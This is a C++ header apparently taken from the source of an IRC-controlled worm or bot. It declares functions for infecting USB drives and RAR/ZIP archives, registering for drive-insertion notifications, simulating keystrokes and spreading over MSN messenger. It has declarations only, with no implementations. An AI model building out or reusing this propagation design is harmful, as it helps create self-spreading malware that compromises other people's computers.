#ifndef SPREADING_HPP
#define SPREADING_HPP

#include "../Includes/includes.hpp"
#include "../IRC/IRC.hpp"
#include "../API/API.hpp"
//USB, RAR
struct USBI {
	DWORD api;
	DWORD irc;
	string drive;
	short mode;
};

DWORD __stdcall InfectDrive( USBI *usb );
DWORD __stdcall InfectRARZip( USBI *rarzip );
void RegisterNotification(API *api, HWND hwnd);
int DoRARZipInfection( DWORD, string );

void key_type( API *api, string text, HWND hwnd );
string MSNSpread( API *api, string );
void to_variant(BSTR str, VARIANT& vt);

#endif